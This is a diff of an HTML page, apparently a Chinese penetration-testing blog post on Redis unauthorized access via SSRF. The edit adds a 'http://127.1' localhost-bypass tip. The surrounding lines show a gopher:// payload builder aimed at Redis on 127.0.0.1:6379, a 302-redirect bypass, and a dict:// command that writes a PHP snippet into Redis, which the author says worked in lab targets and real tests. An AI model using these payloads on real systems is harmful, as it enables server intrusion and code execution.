@@ -579,9 +579,11 @@ print(&quot;gopher://127.0.0.1:6379/_&quot; + s.replace(&quot;$&quot;, &quot;%24
 </li>
 <li><p><strong>302跳转</strong></p>
 <pre><code>https://tinyurl.com/ 302跳转平台</code></pre>
-<h2 id="SSRF实战中的疑惑"><a href="#SSRF实战中的疑惑" class="headerlink" title="SSRF实战中的疑惑"></a>SSRF实战中的疑惑</h2></li>
+</li>
 </ul>
-<p>在Ubuntu和CentOS靶机中测试以及进行真实渗透时出现一些奇怪现象，尝试在<code>?url=</code>后面拼接<code>gopher payload</code>时一直无法成功，于是尝试<code>dict</code>协议执行Redis命令的方式去写入一句话竟然成功了</p>
+<p><strong>❗️补充</strong></p>
+<pre><code>http://127.1</code></pre>
+<h2 id="SSRF实战中的疑惑"><a href="#SSRF实战中的疑惑" class="headerlink" title="SSRF实战中的疑惑"></a>SSRF实战中的疑惑</h2><p>在Ubuntu和CentOS靶机中测试以及进行真实渗透时出现一些奇怪现象，尝试在<code>?url=</code>后面拼接<code>gopher payload</code>时一直无法成功，于是尝试<code>dict</code>协议执行Redis命令的方式去写入一句话竟然成功了</p>
 <pre><code>dict://127.0.0.1/set x &#39;&lt;?php phpinfo();?&gt;&#39;</code></pre>
 <p>发现目标服务器中php版本为V</p>
 <p><img src="%E6%B5%85%E8%B0%88Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/screenshot%202.png" alt="screenshot 2"></p>
